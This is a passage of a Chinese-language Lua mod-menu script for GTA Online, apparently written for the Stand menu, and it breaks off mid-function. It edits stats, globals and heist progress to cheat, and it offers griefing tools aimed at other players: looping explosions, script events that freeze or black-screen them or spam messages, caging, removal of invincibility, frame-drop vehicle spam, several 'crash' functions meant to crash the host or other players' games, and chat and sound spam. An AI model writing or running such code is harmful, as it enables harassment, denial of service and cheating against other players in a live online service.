    memory.write_int(DatePTR+48, 0) 
    STATS.STAT_SET_DATE(util.joaat(ADD_MP_INDEX(Stat)), DatePTR, 7, true)
end

function STAT_SET_PACKED_BOOL(Stat, Value)
    STATS._SET_PACKED_STAT_BOOL(Stat, Value, util.get_char_slot())
end
function STAT_SET_INCREMENT(Stat, Value)
    STATS.STAT_INCREMENT(util.joaat(ADD_MP_INDEX(Stat)), Value, true)
end

function STAT_GET_INT(Stat)
    local IntPTR = memory.alloc_int()
    STATS.STAT_GET_INT(util.joaat(ADD_MP_INDEX(Stat)), IntPTR, -1)
    return memory.read_int(IntPTR)
end
function STAT_GET_FLOAT(Stat)
    local FloatPTR = memory.alloc_int()
    STATS.STAT_GET_FLOAT(util.joaat(ADD_MP_INDEX(Stat)), FloatPTR, -1)
    return tonumber(string.format("%.3f", memory.read_float(FloatPTR)))
end
function STAT_GET_BOOL(Stat)
    if STAT_GET_INT(Stat) == 0 then
        return "false"
    elseif STAT_GET_INT(Stat) == 1 then
        return "true"
    else
        return "STAT_UNKNOWN"
    end 
end
function STAT_GET_STRING(Stat)
    return STATS.STAT_GET_STRING(util.joaat(ADD_MP_INDEX(Stat)), -1)
end
function STAT_GET_DATE(Stat, Sort)
    local DatePTR = memory.alloc(7*8)
    STATS.STAT_GET_DATE(util.joaat(ADD_MP_INDEX(Stat)), DatePTR, 7, true)
    local Add = 0
    if Sort == "Year" then
        Add = 0
    elseif Sort == "Month" then
        Add = 8
    elseif Sort == "Day" then
        Add = 16
    elseif Sort == "Hour" then
        Add = 24
    elseif Sort == "Min" then
        Add = 32
    end
    return memory.read_int(DatePTR+Add)
end

function SET_INT_GLOBAL(Global, Value)
    memory.write_int(memory.script_global(Global), Value)
end
function SET_FLOAT_GLOBAL(Global, Value)
    memory.write_float(memory.script_global(Global), Value)
end

function GET_INT_GLOBAL(Global)
    return memory.read_int(memory.script_global(Global))
end

function SET_PACKED_INT_GLOBAL(StartGlobal, EndGlobal, Value)
    for i = StartGlobal, EndGlobal do
        SET_INT_GLOBAL(262145 + i, Value)
    end
end

function SET_INT_LOCAL(Script, Local, Value)
    if memory.script_local(Script, Local) ~= 0 then
        memory.write_int(memory.script_local(Script, Local), Value)
    end
end
function SET_FLOAT_LOCAL(Script, Local, Value)
    if memory.script_local(Script, Local) ~= 0 then
        memory.write_float(memory.script_local(Script, Local), Value)
    end
end

function GET_INT_LOCAL(Script, Local)
    if memory.script_local(Script, Local) ~= 0 then
        local Value = memory.read_int(memory.script_local(Script, Local))
        if Value ~= nil then
            return Value
        end
    end
end

function TELEPORT(X, Y, Z)
    PED.SET_PED_COORDS_KEEP_VEHICLE(players.user_ped(), X, Y, Z)
end
function SET_HEADING(Heading)
    ENTITY.SET_ENTITY_HEADING(players.user_ped(), Heading)
end

function IsWorking(IsAddNewLine)
    local State = "" 
    if util.is_session_started() then
        if GET_INT_LOCAL("freemode", 3504) ~= util.joaat("lr_prop_carkey_fob") then 
            State = "[NOT WORKING]"
            if IsAddNewLine then
                State = State .. "\n\n"
            end
        end
    end
    return State
end

function RGB(R, G, B, A) 
    local Color = {}
    Color.r = R
    Color.g = G
    Color.b = B
    Color.a = A
    return Color
end

function HelpMsgBeingDisplayed(Label) 
    HUD.BEGIN_TEXT_COMMAND_IS_THIS_HELP_MESSAGE_BEING_DISPLAYED(Label) 
    return HUD.END_TEXT_COMMAND_IS_THIS_HELP_MESSAGE_BEING_DISPLAYED(0)
end

function IS_PED_PLAYER(Ped)
    if PED.GET_PED_TYPE(Ped) >= 4 then
        return false
    else
        return true
    end
end

function FORCE_CLOUD_SAVE()
    STATS.STAT_SAVE(0, 0, 3, 0) 
    util.yield(1500)
    util.arspinner_enable()
    util.yield(4500)
    util.arspinner_disable()
end

function IA_MENU_OPEN()
    PAD._SET_CONTROL_NORMAL(0, 244, 1)
    util.yield(200)
end
function IA_MENU_UP(Num)
    for i = 1, Num do
        PAD._SET_CONTROL_NORMAL(0, 172, 1)
        util.yield(200)
    end
end
function IA_MENU_DOWN(Num)
    for i = 1, Num do
        PAD._SET_CONTROL_NORMAL(0, 173, 1)
        util.yield(200)
    end
end
function IA_MENU_ENTER(Num)
    for i = 1, Num do
        PAD._SET_CONTROL_NORMAL(0, 176, 1)
        util.yield(200)
    end
end
dao= menu.list(PlayerMainMenu, "佩里科岛抢劫任务", {}, "", function(); end)

menu.divider(dao, "佩里科岛抢劫")

menu.action(dao, "呼叫虎鲸", {"callkoh"}, "", function()
    SET_INT_GLOBAL(2815059 + 933, 1)
;  end)
menu.action(dao, "传送到前置面板（先呼叫虎鲸）", {"tpkokathb"}, "", function()
    if STAT_GET_INT("IH_SUB_OWNED") == 0 then
    else
        TELEPORT(1561.2369, 385.8771, -49.689915)
        SET_HEADING(175)
        STAT_SET_INT("H4_PROGRESS", 131055)
    end
;  end)

menu.action(dao, "跳过所有前置", {}, "", function()
    STAT_SET_INT("H4_MISSIONS", -1)
    STAT_SET_INT("H4CNF_APPROACH", -1)
    STAT_SET_INT("H4CNF_TARGET", 5)
    STAT_SET_INT("H4CNF_BS_ENTR", 63)
    STAT_SET_INT("H4CNF_BS_GEN", 63)
end)
menu.action(dao, "传送到大门", {}, "", function()
    TELEPORT(4974.189, -5703.279, 19.898539)
;  end)

menu.action(dao,("删除铁栅栏"), {"hccprempipe"}, "", function() 
    for k, ent in pairs(entities.get_all_objects_as_handles()) do
        if ENTITY.GET_ENTITY_MODEL(ent) == -1297635988 then
            entities.delete_by_handle(ent)
        end
    end
end)
menu.action(dao, "传送到主要目标", {}, "", function()
    TELEPORT(5006.7, -5756.2, 14.8)
    SET_HEADING(145)
;  end)
menu.action(dao, "快速切开玻璃", {}, IsWorking(false), function()
    SET_FLOAT_LOCAL("fm_mission_controller_2020", 28736 + 3, 100)
end, function()
    SET_FLOAT_LOCAL("fm_mission_controller_2020", 28736 + 3, 0)
end)

menu.action(dao, "传送到出口", {}, "", function()
    TELEPORT(4990.0386, -5717.6895, 19.880217)
    SET_HEADING(50)
;  end)

menu.action(dao, "传送到大海", {}, "", function()
    TELEPORT(4771.479, -6165.737, -39.079613)
;  end)


menu.action(dao, "一键完成任务(单人)", {}, "风险自控", function()
    util.request_script_host("fm_mission_controller_2020")
    SET_INT_LOCAL("fm_mission_controller_2020", 31554 + 6843, 983040)
    SET_INT_LOCAL("fm_mission_controller_2020", 31554 + 8218, 50)
;  end)

dc= menu.list(PlayerMainMenu, "DC名钻豪劫任务", {}, "", function(); end)


menu.divider(dc, "名钻赌场抢劫")
menu.action(dc,("传送到前置面板"), {}, "", function()
    TELEPORT(2711.773, -369.458, -54.781)
end)
menu.action(dc,("完成任务面板"), {}, "", function()
    STAT_SET_INT("H3OPT_BITSET1", -1)
    STAT_SET_INT("H3OPT_BITSET0", -1)
    end)
    menu.action(dc,("绕过冷却（风险巨大）"), {}, "风险很大，封号了别哭QWQ", function()
        STAT_SET_INT("H3_COMPLETEDPOSIX", -1)
        STAT_SET_INT("MPPLY_H3_COOLDOWN", -1)
    end)





menu.action(dc,("游戏厅车库门口"), {}, "", function()
    TELEPORT(2677.237, -361.494, -55.187)
end)
menu.action(dc, ("废物处理间门口"), {}, "", function()
    TELEPORT(2542.052, -214.3084, -58.722965)
end)
menu.action(dc,("员工大门"), {}, "", function()
    TELEPORT(2547.9192, -273.16754, -58.723003)
end)
menu.action(dc,("刷卡点"), {}, "", function()
    TELEPORT(2465.4746, -279.2276, -70.694145)
end)
menu.action(dc,("金库内部"), {}, "", function()
    TELEPORT(2515.1252, -238.91661, -70.73713)
end)
menu.action(dc,("金库门口"), {}, "", function()
    TELEPORT(2497.5098, -238.50768, -70.7388)
end)
menu.action(dc,("小金库开关处"), {}, "", function()
    TELEPORT(2520.8645, -286.30685, -58.723007)
end)

mori= menu.list(PlayerMainMenu, "末日豪劫任务", {}, "", function(); end)
menu.action(mori, "传送到任务大屏", {}, "", function()
    TELEPORT(350.69284, 4872.308, -60.794243)
    SET_HEADING(-50)
end)
menu.action(mori, "传送到囚室",{} ,"", function()
    TELEPORT(512.888, 4833.033, -68.989)
end)
menu.action(mori,("解锁所有末日豪劫"), {}, "", function()
    STAT_SET_INT("GANGOPS_HEIST_STATUS", -1)
    STAT_SET_INT("GANGOPS_HEIST_STATUS", -229384)
end)


PlayerMainMenu = menu.list(renwu, "事务所任务", {}, "", function(); end)
heyue= menu.list(PlayerMainMenu, "事务所任务", {}, "", function(); end)


menu.toggle_loop(heyue, ("修改合同付款200万"), {},"", function()
    SET_INT_GLOBAL(262145 + 31735, 2000000)
end, function()
    SET_INT_GLOBAL(262145 + 31735, 1000000)
end)

menu.action(heyue, ("完成所有任务"), {}, "", function()
    STAT_SET_INT("FIXER_GENERAL_BS", -1)
    STAT_SET_INT("FIXER_COMPLETED_BS", -1)
    STAT_SET_INT("FIXER_STORY_BS", -1)
    STAT_SET_INT("FIXER_STORY_COOLDOWN", -1)
end)

menu.action(renwu, ("解锁所有联系人"), {}, "", function()
    STAT_SET_INT("FM_ACT_PHN", -1)
    STAT_SET_INT("FM_ACT_PH2", -1)
    STAT_SET_INT("FM_ACT_PH3", -1)
    STAT_SET_INT("FM_ACT_PH4", -1)
    STAT_SET_INT("FM_ACT_PH5", -1)
    STAT_SET_INT("FM_VEH_TX1", -1)
    STAT_SET_INT("FM_ACT_PH6", -1)
    STAT_SET_INT("FM_ACT_PH7", -1)
    STAT_SET_INT("FM_ACT_PH8", -1)
    STAT_SET_INT("FM_ACT_PH9", -1)
    STAT_SET_INT("FM_CUT_DONE", -1)
    STAT_SET_INT("FM_CUT_DONE_2", -1)
end)



custselc = menu.list(menu.my_root(), "噪音选项", {}, "", function(); end)
menu.action(custselc,"防空警报", {oooooooooooooo}, "oooooooooooooo", function()
    local pos, exp_pos = v3(), v3()
    local Audio_POS = {v3(-73.31681060791,-820.26013183594,326.17517089844),v3(2784.536,5994.213,354.275),v3(-983.292,-2636.995,89.524),v3(1747.518,4814.711,41.666),v3(1625.209,-76.936,166.651),v3(751.179,1245.13,353.832),v3(-1644.193,-1114.271,13.029),v3(462.795,5602.036,781.400),v3(-125.284,6204.561,40.164),v3(2099.765,1766.219,102.698)}
    
    for i = 1, #Audio_POS do

    AUDIO.PLAY_SOUND_FROM_COORD(-1, "Air_Defences_Activated", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "DLC_sum20_Business_Battle_AC_Sounds", true, 999999999, true)
    pos.z = 2000.00
    
    AUDIO.PLAY_SOUND_FROM_COORD(-1, "Air_Defences_Activated", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "DLC_sum20_Business_Battle_AC_Sounds", true, 999999999, true)
        pos.z = -2000.00
    
    AUDIO.PLAY_SOUND_FROM_COORD(-1, "Air_Defences_Activated", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "DLC_sum20_Business_Battle_AC_Sounds", true, 999999999, true)
    
    for pid = 0, 31 do
        local pos =	NETWORK._NETWORK_GET_PLAYER_COORDS(pid)
        AUDIO.PLAY_SOUND_FROM_COORD(-1, "Air_Defences_Activated", pos.x, pos.y, pos.z, "DLC_sum20_Business_Battle_AC_Sounds", true, 999999999, true)
    end

    end
end
)
menu.action(custselc,"聋的传人", {oooooooooooooo}, "oooooooooooooo", function()
local pos = v3()
local Audio_POS = {v3(-73.31681060791,-820.26013183594,326.17517089844),v3(2784.536,5994.213,354.275),v3(-983.292,-2636.995,89.524),v3(1747.518,4814.711,41.666),v3(1625.209,-76.936,166.651),v3(751.179,1245.13,353.832),v3(-1644.193,-1114.271,13.029),v3(462.795,5602.036,781.400),v3(-125.284,6204.561,40.164),v3(2099.765,1766.219,102.698)}

for i = 1, #Audio_POS do

    AUDIO.PLAY_SOUND_FROM_COORD(-1, "Bed", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "WastedSounds", true, 999999999, true)
    pos.z = 2000.00

    AUDIO.PLAY_SOUND_FROM_COORD(-1, "Bed", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "WastedSounds", true, 999999999, true)
    pos.z = -2000.00

    AUDIO.PLAY_SOUND_FROM_COORD(-1, "Bed", Audio_POS[i].x, Audio_POS[i].y, Audio_POS[i].z, "WastedSounds", true, 999999999, true)

    for pid = 0, 31 do
        local pos =	NETWORK._NETWORK_GET_PLAYER_COORDS(pid)
        AUDIO.PLAY_SOUND_FROM_COORD(-1, "Bed", pos.x, pos.y, pos.z, "WastedSounds", true, 999999999, true)
    end
end		
end)
Chat = menu.list(menu.my_root(), "公屏选项", {}, "", function(); end)

menu.divider(Chat, "刷屏选项")

menu.action(Chat,"清屏", {},"",function()
for i = 1, 100 do
local ret = "  "
    chat.send_message(ret, false, true, true)
end
end)

menu.action(Chat,"踢广告机", {},"",function()
    chat.send_message("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n=======YIYU Script=======\n ‹ 已自动踢出广告机 ‹      \n=========(=•w•=)=======",false,true,true)
end)
menu.action(Chat,"社会主义核心价值观",{},"",function()
    local ershi1 = "富强 民主 文明 和谐"
    local ershi2 = "自由 平等 公正 法制"
    local ershi3 = "爱国 敬业 诚信 友善"
    chat.send_message(ershi1, false, true, true)
    util.yield(1000)
    chat.send_message(ershi2, false, true, true)
    util.yield(1000)
    chat.send_message(ershi3, false, true, true)
    util.yield(850)
    end)

menu.action(Chat,"十八大", {},"",function()
local shiba1 = "全面推进依法治国，必须贯彻落实党的十八大和十八届三中全会精神"
local shiba2 = "高举中国特色社会主义伟大旗帜"
local shiba3 = "以马克思列宁主义、毛泽东思想、邓小平理论、三个代表重要思想、科学发展观为指导"
local shiba4 = "深入贯彻习近平总书记系列重要讲话精神"
chat.send_message(shiba1, false, true, true)
util.yield(5000)
chat.send_message(shiba2, false, true, true)
util.yield(2000)
chat.send_message(shiba3, false, true, true)
util.yield(7000)
chat.send_message(shiba4, false, true, true)
util.yield(1000)
end)

menu.action(Chat,"二十大",{},"",function()
local ershi1 = "深入学习党的十九大及十九届历次全会精神，深刻领会“两个确立”的决定性意义，不断增强“两个维护”的政治自觉、思想自觉、行动自觉，确保在政治立场、政治方向、政治原则、政治道路上始终同以习近平同志为核心的党中央保持高度一致"
local ershi2 = "带头学习贯彻习近平新时代中国特色社会主义思想，坚持用马克思主义之“矢”去射新时代中国之“的”。扎实开展党史学习教育，自觉弘扬伟大建党精神，始终掌握新时代新征程党和国家事业发展的历史主动"
local ershi3 = "坚决贯彻落实党中央决策部署和习近平总书记重要指示批示精神，统筹推进疫情防控和经济社会发展、统筹发展和安全，增强斗争精神和斗争本领，分类精准施策，积极研究推动分管领域工作，认真完成党中央赋予的职责任务"
local ershi4 = "认真履行全面从严治党主体责任，严格执行请示报告制度，扎实推进分管领域党风廉政建设和反腐败工作，切实加强领导班子和干部队伍建设，全面提高党的建设质量"
local ershi5 = "严格落实中央八项规定及其实施细则精神，坚持以身作则、廉洁自律，坚决反对形式主义、官僚主义，坚决反对特权思想，从严教育管理亲属和身边工作人员，主动接受各方面监督"
chat.send_message(ershi1, false, true, true)
util.yield(11000)
chat.send_message(ershi2, false, true, true)
util.yield(11000)
chat.send_message(ershi3, false, true, true)
util.yield(8000)
chat.send_message(ershi4, false, true, true)
util.yield(5000)
chat.send_message(ershi5, false, true, true)
util.yield(5000)
end)

fanghu=menu.list(menu.my_root(), "防护选项", {}, "", function(); end)
menu.divider(fanghu, "防护选项")

menu.action(fanghu, "强制停止所有声音", {""}, "", function()
    for i=-1,100 do
        AUDIO.STOP_SOUND(i)
        AUDIO.RELEASE_SOUND_ID(i)
    end
end)
menu.action(fanghu, "超级清", {"清除一切"}, "", function()
    local ct = 0
    for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
        entities.delete_by_handle(ent)

        ct = ct + 1
    end
    util.toast("正在清除")
    for k,ent in pairs(entities.get_all_peds_as_handles()) do
        if not PED.IS_PED_A_PLAYER(ent) then
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
            entities.delete_by_handle(ent)

        end
        ct = ct + 1
    end

end)

menu.toggle_loop(fanghu, "循环清", {}, "", function()
    util.toast("循环清除中")
    MISC.CLEAR_AREA(0,0,0 , 1000000, true, true, true, true)
end)


menu.toggle(fanghu, "昏哥模式", {"panic"}, "自闭哥你好呀", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    if on_toggle then
        menu.trigger_commands("desyncall on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_commands("anticrashcamera on")
    else
        menu.trigger_commands("desyncall off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_commands("anticrashcamera off")
    end
end)

other=menu.list(menu.my_root(), "其他选项", {}, "", function(); end)
menu.divider(other, "其他选项")
menu.action(other, "自定义警告", {"banner "}, "", function(on_click) menu.show_command_box("banner ") end, function(text)
    custom_alert(text)
end)


local mingxie=menu.list(other, "鸣谢", {}, "")
menu.divider(mingxie, "作者")
menu.action(mingxie, "易宇", {}, "CVer", function()
    notification("~bold~易宇大帅逼", colors.black)
    util.show_corner_help(" ‹  ‹  ‹  \nDiscord:YIYU-易宇#3597 QQ:3548999193\n  ‹  ‹  ‹ ")
end)
menu.divider(mingxie, "技术支持")
menu.action(mingxie, "吃饼", {}, "", function()
end)
menu.action(mingxie, "意", {}, "技术支持", function()
end)
menu.action(mingxie, "Vidoliga", {},"技术支持", function()
end)
menu.action(mingxie, "十一", {}, "技术支持", function()
end)
menu.action(mingxie, "马东锡" , {}, "提供XOR加密", function()
end)
menu.divider(mingxie, "死妈代表人")
menu.action(mingxie, "iz5mc", {}, "死妈代表人", function()
end)
menu.hyperlink(other, "加入群聊", "https://jq.qq.com/?_wv=1027&k=zkh6bzBD", "加入QQ群聊")

menu.toggle_loop(other, "：）", {""}, "", function()
    MISC.FORCE_LIGHTNING_FLASH()
util.show_corner_help("~bold~~r~不要核酸要吃饭!  不要封控要自由!  不要谎言要尊严!  不要文革要改革!  ")
end)
menu.action(other, "重新启动GTA", {}, "", function()
    MISC._RESTART_GAME()
end)

KickScriptEvent = {
    1674887089,
    608596116,
    1781594056,
    -442434037
        }
    
    function CreateVehicle(Hash, Pos, Heading, Invincible)
        STREAMING.REQUEST_MODEL(Hash)
        while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
        local SpawnedVehicle = entities.create_vehicle(Hash, Pos, Heading)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
        if Invincible then
            ENTITY.SET_ENTITY_INVINCIBLE(SpawnedVehicle, true)
        end
        return SpawnedVehicle
    end
    
    function CreatePed(index, Hash, Pos, Heading)
        STREAMING.REQUEST_MODEL(Hash)
        while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
        local SpawnedVehicle = entities.create_ped(index, Hash, Pos, Heading)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
        return SpawnedVehicle
    end
    
    function CreateObject(Hash, Pos, static)
        STREAMING.REQUEST_MODEL(Hash)
        while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
        local SpawnedVehicle = entities.create_object(Hash, Pos)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
        if static then
            ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicle, true)
        end
        return SpawnedVehicle
    end
    
    util.keep_running()



function set_up_player_actions(pid)
    menu.divider(menu.player_root(pid), "YIYU Script选项")
    PlayerMainMenu = menu.list(menu.player_root(pid), "崩溃/踢出/恶搞选项", {}, "", function(); end)
    menu.action(menu.player_root(pid), "传送至玩家", {""}, "", function()
        local TTPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local spped = PLAYER.PLAYER_PED_ID()
            local ye = ENTITY.GET_ENTITY_COORDS(TTPed, true)
            ENTITY.SET_ENTITY_COORDS(spped, ye.x, ye.y, ye.z, true, false, false)
            util.yield(10 * math.random())
end)	

     eg= menu.list(PlayerMainMenu, "恶搞", {}, "", function(); end)


    menu.toggle_loop(eg, "循环喷火", {""}, "", function(on_click)
    local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

    local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)

    FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 12, 100.0, true, false, 0.0)

end)

menu.toggle_loop(eg, "循环喷水", {""}, "", function(on_click)
    local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)

FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 13, 100.0, true, false, 0.0)

end)
menu.toggle_loop(eg, "混合恶搞", {""}, "", function(on_click)
    local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local coords = ENTITY.GET_ENTITY_COORDS(target_ped)
    FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], math.random(0, 82), 1.0, true, false, 0.0)
end)
menu.toggle_loop(eg, "让玩家黑屏", {""}, "", function(on_click)
    util.trigger_script_event(1 << pid, {-555356783, pid, math.random(1, 32), 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(pid), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    util.yield(1000)
end)
menu.toggle_loop(eg, "冻结V1", {""}, "", function(on_click)
    util.trigger_script_event(1 << pid, {0x4868BC31, pid, 0, 0, 0, 0, 0})
    util.yield(500)
end)
menu.toggle_loop(eg, "冻结V2", {""}, "", function(on_click)
    util.trigger_script_event(1 << pid, {0x7EFC3716, pid, 0, 1, 0, 0})
    util.yield(500)
end)
menu.toggle_loop(eg, "冻结V3", {""}, "", function(on_click)

    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
end)

menu.toggle_loop(eg, "垃圾短信轰炸", {""}, "", function(on_click)
    util.trigger_script_event(1 << pid, {0xDA29E2BC, pid, math.random(0, 0xB2), 0, 0, 0})
    util.yield()
end)
menu.toggle_loop(eg, "公寓邀请信息轰炸", {""}, "", function(on_click)
    util.trigger_script_event(1 << pid, {0x4246AA25, pid, math.random(1, 0x6)})
    util.yield()
end)

menu.action(eg, "刀勒笼子", {""}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("bkr_prop_moneypack_03a")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z, true, true, false) 
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z, true, true, false) 
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z, true, true, false) 
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z, true, true, false) 

	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z + .25, true, true, false) 
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z + .25, true, true, false) 
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z + .25, true, true, false) 
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z + .25, true, true, false) 

	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .75, true, true, false) 
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	util.yield(15)
	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	rot.y = 90
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)

menu.action(eg, "圣诞笼子", {""}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("ch_prop_tree_02a")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .75, pos.y, pos.z - .5, true, true, false) 
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .75, pos.y, pos.z - .5, true, true, false) 
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .75, pos.z - .5, true, true, false) 
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .75, pos.z - .5, true, true, false) 
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .5, true, true, false) 
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	util.yield(15)

	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)
menu.action(eg, "移除玩家无敌", {""}, "", function()
util.trigger_script_event(1 << pid, {0xAD36AA57, pid, 0x96EDB12F, math.random(0, 0x270F)})
end)
menu.action(eg, "移除载具无敌", {""}, "", function()
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    if PED.IS_PED_IN_ANY_VEHICLE(ped, false) and not PED.IS_PED_DEAD_OR_DYING(ped) then
        local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
        ENTITY.SET_ENTITY_CAN_BE_DAMAGED(veh, true)
        ENTITY.SET_ENTITY_INVINCIBLE(veh, false)
        ENTITY.SET_ENTITY_PROOFS(veh, false, false, false, false, false, 0, 0, false)
    end
end)

menu.action(eg,"掉帧攻击（多按效果更好）", {}, "", function() 
    while not STREAMING.HAS_MODEL_LOADED(447548909) do
        STREAMING.REQUEST_MODEL(447548909)
        util.yield(10)
    end
    local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
    local OldCoords = ENTITY.GET_ENTITY_COORDS(self_ped) 
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self_ped, 24, 7643.5, 19, true, true, true)

    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
    spam_amount = 300
    while spam_amount >= 1 do
        entities.create_vehicle(447548909, PlayerPedCoords, 0)
        spam_amount = spam_amount - 1
        util.yield(10)
    end
    end)



    Crash= menu.list(PlayerMainMenu, "崩溃", {}, "", function(); end)

    menu.action(Crash, "主机崩溃V1", {""}, "", function()
        local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        menu.trigger_commands("tpmazehelipad")
        ENTITY.SET_ENTITY_COORDS(self_ped, -6170, 10837, 40, true, false, false)
        util.yield(1000)
        menu.trigger_commands("tpmazehelipad")
    end)


    menu.action(Crash, "主机崩溃V2", {""}, "", function()
        util.toast("开始崩溃")
        local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        ENTITY.SET_ENTITY_COORDS(self_ped, -6170, 10837, 40, true, false, false)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS(self_ped, -18, 708, 243, true, false, false)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS(self_ped, -74, 100, 174, true, false, false)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS(self_ped, -101, 100, 374, true, false, false)
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS(self_ped, -6170, 10837, 40, true, false, false)
        util.yield(900)
        ENTITY.SET_ENTITY_COORDS(self_ped, -18, 708, 243, true, false, false)
        util.yield(900)
        ENTITY.SET_ENTITY_COORDS(self_ped, -74, 100, 174, true, false, false)
        util.yield(900)
        ENTITY.SET_ENTITY_COORDS(self_ped, -101, 100, 374, true, false, false)
        util.yield(1000)
        menu.trigger_commands("tpmtchiliad")
        util.toast("崩溃完成")
    end)
   
    local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
    pos.z = pos.z + 10
    veh = entities.get_all_vehicles_as_handles()

menu.action(Crash, "5G崩溃", {""}, "", function()
        local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
        pos.z = pos.z + 10
        veh = entities.get_all_vehicles_as_handles()
        
      for i = 1, #veh do
      NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh[i])
      ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh[i], pos.x,pos.y,pos.z, ENTITY.GET_ENTITY_HEADING(TPP), 10)
      TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 18, 999)
      TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 16, 999)
      end
  end)
  menu.action(Crash, "易宇崩溃", {""}, "", function()
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
